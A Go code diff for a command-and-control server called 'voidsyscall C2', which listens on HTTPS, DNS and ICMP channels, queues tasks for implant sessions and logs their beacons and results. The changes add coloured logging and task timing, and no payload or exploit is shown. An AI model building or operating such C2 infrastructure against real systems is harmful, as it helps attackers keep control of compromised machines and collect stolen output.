@@ -58,10 +58,10 @@ func (s *Server) Run() error {
 	log.SetFlags(log.LstdFlags | log.Lmicroseconds)
 	log.SetOutput(os.Stdout)
 
-	log.Printf("[+] voidsyscall C2 starting")
-	log.Printf("[+] HTTP: %s:%d", s.config.HTTPAddr, s.config.HTTPSPort)
-	log.Printf("[+] DNS: %s:%d", s.config.DNSAddr, s.config.DNSPort)
-	log.Printf("[+] ICMP: %s", s.config.ICMPAddr)
+	log.Printf("%s[+] voidsyscall C2 starting%s", AnsiGreen, AnsiReset)
+	log.Printf("%s[+] HTTP:%s %s%s:%d%s", AnsiGreen, AnsiReset, AnsiCyan, s.config.HTTPAddr, s.config.HTTPSPort, AnsiReset)
+	log.Printf("%s[+] DNS:%s %s%s:%d%s", AnsiGreen, AnsiReset, AnsiCyan, s.config.DNSAddr, s.config.DNSPort, AnsiReset)
+	log.Printf("%s[+] ICMP:%s %s%s", AnsiGreen, AnsiReset, AnsiCyan, s.config.ICMPAddr)
 
 	go s.startHTTPServer()
 	go s.startDNSServer()
@@ -70,7 +70,7 @@ func (s *Server) Run() error {
 	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
 
 	<-sigChan
-	log.Printf("[!] Shutting down...")
+	log.Printf("%s[!] Shutting down...%s", AnsiYellow, AnsiReset)
 	s.cancel()
 	time.Sleep(1 * time.Second)
 	return nil
@@ -87,7 +87,7 @@ func (s *Server) startHTTPServer() {
 
 	ch, err := channels.New(channels.ChannelHTTPS, httpCfg)
 	if err != nil {
-		log.Printf("[-] HTTP channel error: %v", err)
+		log.Printf("%s[-] HTTP channel error: %v%s", AnsiRed, err, AnsiReset)
 		return
 	}
 
@@ -102,7 +102,7 @@ func (s *Server) startHTTPServer() {
 		err = ch.Listen(s.ctx, fmt.Sprintf("%s:%d", s.config.HTTPAddr, s.config.HTTPSPort), s.handleMessage)
 	}
 	if err != nil && err != http.ErrServerClosed {
-		log.Printf("[-] HTTP listen error: %v", err)
+		log.Printf("%s[-] HTTP listen error: %v%s", AnsiRed, err, AnsiReset)
 	}
 }
 
@@ -116,23 +116,24 @@ func (s *Server) startDNSServer() {
 
 	ch, err := channels.New(channels.ChannelDNS, dnsCfg)
 	if err != nil {
-		log.Printf("[-] DNS channel error: %v", err)
+		log.Printf("%s[-] DNS channel error: %v%s", AnsiRed, err, AnsiReset)
 		return
 	}
 
 	addr := fmt.Sprintf("%s:%d", s.config.DNSAddr, s.config.DNSPort)
 	err = ch.Listen(s.ctx, addr, s.handleMessage)
 	if err != nil {
-		log.Printf("[-] DNS listen error: %v", err)
+		log.Printf("%s[-] DNS listen error: %v%s", AnsiRed, err, AnsiReset)
 	}
 }
 
 func (s *Server) handleMessage(msg *channels.Message) *channels.Message {
 	session := s.sessions.GetOrCreate(msg.ID, nil, "unknown")
 
-	log.Printf("[+] Beacon from %x (channel: %s)", msg.ID[:8], session.Channel)
-
+	hexID := fmt.Sprintf("%x", msg.ID[:8])
 	if msg.Type == 0x01 {
+		log.Printf("%s[*] Beacon %s%s%s (%s%s%s)%s",
+			AnsiBlue, AnsiReset, AnsiMagenta, hexID, AnsiReset, AnsiCyan, session.Channel, AnsiReset)
 		// Beacon — check for queued tasks
 		task := session.DequeueTask()
 		if task == nil {
@@ -164,7 +165,19 @@ func (s *Server) handleMessage(msg *channels.Message) *channels.Message {
 		copy(result.TaskID[:], msg.ID[:])
 		session.AddResult(result)
 
-		log.Printf("[+] Result from %x: status=%d output=%s", msg.ID[:8], status, string(output))
+		elapsed := session.TaskElapsed(result.TaskID)
+		elapsedStr := ""
+		if elapsed > 0 {
+			elapsedStr = fmt.Sprintf(" (%.1fs)", elapsed.Seconds())
+		}
+		statusColor := AnsiGreen
+		if status != 0 {
+			statusColor = AnsiRed
+		}
+		log.Printf("%s[+] Result from %s%s%s %sstatus=%d %s%s%s",
+			AnsiGreen, AnsiMagenta, hexID, AnsiReset,
+			statusColor, status, AnsiYellow, elapsedStr, AnsiReset)
+		log.Printf("%s", string(output))
 
 		return &channels.Message{Type: 0x02, Data: []byte{0x00}}
 	}
@@ -190,7 +203,14 @@ func (s *Server) EnqueueTask(sessionID [16]byte, taskType TaskType, data []byte)
 	copy(task.ID[:], taskID[:])
 
 	session.EnqueueTask(task)
-	log.Printf("[+] Task queued for %x: type=%d", sessionID[:8], taskType)
+	session.RecordTask(taskID)
+	log.Printf(
+		"%s[+] Task queued for %s%x%s type=%d%s",
+		AnsiGreen,
+		AnsiReset, sessionID[:8],
+		AnsiReset, taskType,
+		AnsiReset,
+	)
 	return nil
 }
 
